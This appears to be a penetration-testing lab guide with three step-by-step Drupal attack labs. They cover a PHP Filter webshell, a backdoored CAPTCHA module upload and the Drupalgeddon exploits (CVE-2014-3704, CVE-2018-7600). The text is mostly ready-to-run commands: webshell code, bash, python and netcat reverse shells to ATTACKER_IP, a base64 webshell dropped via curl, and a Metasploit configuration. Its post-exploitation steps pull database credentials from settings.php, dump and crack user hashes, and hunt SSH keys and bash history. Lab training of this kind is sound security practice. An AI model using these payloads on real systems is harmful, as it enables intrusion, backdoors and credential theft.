# Drupal Labs

---

## Lab 1: Authenticated RCE — PHP Filter Module → Webshell → Reverse Shell

**Scenario:** You have Drupal 7 admin credentials. Achieve RCE via the built-in PHP Filter module.

### Steps

- [ ] Login to Drupal admin panel at `http://TARGET/user/login`
- [ ] Navigate to Modules: `http://TARGET/admin/modules`
- [ ] Scroll to "PHP filter" → check the box → click **Save configuration**
- [ ] Navigate to Content → Add content → Basic page (`http://TARGET/node/add/page`)
- [ ] Set Title: `Shell`
- [ ] Set Body:
```php
<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>
```
- [ ] Change **Text format** dropdown to **PHP code**
- [ ] Click **Save**
- [ ] Note the node path in the URL (e.g., `/node/3`)
- [ ] Verify command execution:
```bash
curl -s "http://TARGET/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id"
```
- [ ] Enumerate the system:
```bash
curl -s "http://TARGET/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=uname+-a"
curl -s "http://TARGET/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=cat+/etc/passwd"
curl -s "http://TARGET/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=which+python+python3+nc+ncat"
```
- [ ] Set up listener on attack box:
```bash
nc -nlvp 443
```
- [ ] Trigger reverse shell (try in order until one works):
```bash
# Bash reverse shell
curl -s --data-urlencode "dcfdd5e021a869fcc6dfaef8bf31377e=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'" \
  "http://TARGET/node/3"

# Python reverse shell (if python available)
curl -s --data-urlencode "dcfdd5e021a869fcc6dfaef8bf31377e=python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" \
  "http://TARGET/node/3"

# Netcat reverse shell
curl -s --data-urlencode "dcfdd5e021a869fcc6dfaef8bf31377e=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 443 >/tmp/f" \
  "http://TARGET/node/3"
```
- [ ] Upgrade to fully interactive TTY:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### Post-Exploit

- [ ] Grab DB creds from settings.php:
```bash
cat /var/www/html/sites/default/settings.php | grep -A 10 'databases'
```
- [ ] Dump user hashes:
```bash
mysql -u <dbuser> -p'<dbpass>' <dbname> -e "SELECT uid, name, pass FROM users;"
```
- [ ] Crack hashes (Drupal 7 = hashcat mode 7900):
```bash
hashcat -m 7900 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## Lab 2: Authenticated RCE — Backdoored CAPTCHA Module

**Scenario:** You have admin credentials on any Drupal version. Achieve RCE by uploading a backdoored module without needing PHP Filter.

### Preparation (Attack Box)

- [ ] Download a legitimate module:
```bash
wget https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
```
- [ ] Extract:
```bash
tar xzf captcha-8.x-1.2.tar.gz
```
- [ ] Create webshell inside module directory:
```bash
cat > captcha/shell.php << 'SHELL'
<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>
SHELL
```
- [ ] Create .htaccess to allow PHP execution:
```bash
cat > captcha/.htaccess << 'HTACCESS'
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
HTACCESS
```
- [ ] Repackage:
```bash
tar czf captcha-backdoor.tar.gz captcha/
```

### Exploitation

- [ ] Login to Drupal admin panel
- [ ] Navigate to Manage → Extend → **+ Install new module**
  - URL: `http://TARGET/admin/modules/install`
- [ ] Click Browse → select `captcha-backdoor.tar.gz` → click **Install**
- [ ] Wait for "Installation successful" message
- [ ] Test webshell access:
```bash
# Drupal 8+ path
curl -s "http://TARGET/modules/captcha/shell.php?dcfdd5e021a869fcc6dfaef8bf31377e=id"

# Drupal 7 path (if 8+ path fails)
curl -s "http://TARGET/sites/all/modules/captcha/shell.php?dcfdd5e021a869fcc6dfaef8bf31377e=id"
```
- [ ] Confirm execution — you should see `uid=33(www-data)` or similar
- [ ] Set up listener:
```bash
nc -nlvp 443
```
- [ ] Get reverse shell:
```bash
curl -s --data-urlencode "dcfdd5e021a869fcc6dfaef8bf31377e=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'" \
  "http://TARGET/modules/captcha/shell.php"
```

### Troubleshooting

| Problem | Fix |
|---------|-----|
| 403 on shell.php | .htaccess may be blocked — try renaming shell to `.php5` or `.phtml` |
| Module install fails | Check if module install is disabled in settings.php (`$settings['allow_authorize_operations'] = FALSE;`) |
| No output from webshell | Check `disable_functions` in php.ini — try `passthru()`, `exec()`, `shell_exec()` instead of `system()` |

---

## Lab 3: Pre-Auth RCE — Drupalgeddon Exploits

**Scenario:** No credentials. Identify the Drupal version and exploit it with the appropriate Drupalgeddon CVE.

### Phase 1: Version Identification

- [ ] Check CHANGELOG.txt:
```bash
curl -s http://TARGET/CHANGELOG.txt | head -5
curl -s http://TARGET/core/CHANGELOG.txt | head -5
```
- [ ] Run droopescan:
```bash
droopescan scan drupal -u http://TARGET
```
- [ ] Determine which exploit applies:

| Version Range | Vulnerability | CVE |
|---------------|--------------|-----|
| Drupal 7.x < 7.32 | Drupalgeddon (SQLi) | CVE-2014-3704 |
| Drupal < 7.58 | Drupalgeddon2 (RCE) | CVE-2018-7600 |
| Drupal 8.x < 8.3.9 | Drupalgeddon2 (RCE) | CVE-2018-7600 |
| Drupal 8.4.x < 8.4.6 | Drupalgeddon2 (RCE) | CVE-2018-7600 |
| Drupal 8.5.x < 8.5.1 | Drupalgeddon2 (RCE) | CVE-2018-7600 |

### Phase 2A: Drupalgeddon — CVE-2014-3704

- [ ] Copy exploit:
```bash
searchsploit -m 34992
```
- [ ] Run — creates a new admin account:
```bash
python2 34992.py -t http://TARGET -u hacker -p hacker123
```
- [ ] Login with `hacker:hacker123`
- [ ] Proceed to Lab 1 or Lab 2 for RCE

### Phase 2B: Drupalgeddon2 — CVE-2018-7600

- [ ] Copy exploit:
```bash
searchsploit -m 44449
```
- [ ] Run — drops into interactive shell:
```bash
ruby 44449.rb http://TARGET
```
- [ ] If Ruby exploit fails, try manual curl (Drupal 8):
```bash
# Step 1: Write a PHP file to disk
curl -s 'http://TARGET/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
  --data 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=echo PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg== | base64 -d > /var/www/html/cmd.php'

# Step 2: Use the written webshell
curl -s "http://TARGET/cmd.php?c=id"
```
- [ ] Metasploit alternative:
```bash
msfconsole -q
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS TARGET
set RPORT 80
set LHOST ATTACKER_IP
set LPORT 443
run
```

### Phase 3: Post-Exploit (Same for All)

- [ ] Upgrade shell to full TTY (see Lab 1)
- [ ] Grab settings.php for DB creds
- [ ] Dump and crack hashes
- [ ] Check for password reuse across other services
- [ ] Look for SSH keys, config files, other pivot opportunities:
```bash
find / -name "id_rsa" -o -name "authorized_keys" -o -name ".bash_history" 2>/dev/null
cat /home/*/.bash_history 2>/dev/null
```

---

## Lab Flags Checklist

Use this to track completion across all labs:

- [ ] Lab 1: Got webshell via PHP Filter
- [ ] Lab 1: Got reverse shell
- [ ] Lab 1: Extracted DB credentials from settings.php
- [ ] Lab 1: Dumped and cracked user hashes
- [ ] Lab 2: Built backdoored CAPTCHA module
- [ ] Lab 2: Got webshell via module upload
- [ ] Lab 2: Got reverse shell
- [ ] Lab 3: Identified Drupal version
- [ ] Lab 3: Exploited with correct Drupalgeddon CVE
- [ ] Lab 3: Achieved RCE without credentials
- [ ] Lab 3: Completed post-exploitation steps
